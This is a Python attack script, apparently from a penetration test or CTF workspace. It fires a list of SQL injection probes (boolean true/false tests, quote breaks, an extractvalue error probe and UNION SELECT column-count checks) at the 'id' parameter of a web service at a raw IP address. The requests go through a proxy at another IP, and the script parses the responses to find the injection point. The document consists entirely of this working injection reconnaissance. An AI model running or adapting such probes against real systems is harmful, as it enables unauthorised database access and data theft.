import sys, re, os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "_tools"))
import px

B = "http://103.163.47.230:34413/?id="
OP = px.opener("http://143.246.138.227:80")


def q(payload):
    s, h, b = px.get(B + px.urllib.parse.quote(payload, safe=""), OP)
    body = re.sub(r"\s+", " ", b)
    tds = re.findall(r"<td>(.*?)</td>", body)
    m = re.search(r'<div class="msg[^>]*>(.*?)</div>', body)
    return s, len(b), tds, (m.group(1) if m else ""), body


tests = [
    "1 and 1=1",
    "1 and 1=2",
    "1' and '1'='1",
    "1' and '1'='2",
    "1)",
    "1'",
    "1 and extractvalue(1,1)",
    "1 union select 1,2,3",
    "1' union select 1,2,3-- -",
    "-1 union select 1,2,3",
    "-1 union select 1,2,3,4",
    "-1 union select 1,2",
]
for t in tests:
    s, n, tds, msg, body = q(t)
    print("%-30s %s %4d %s %s" % (t, s, n, tds[:6], msg[:60]))
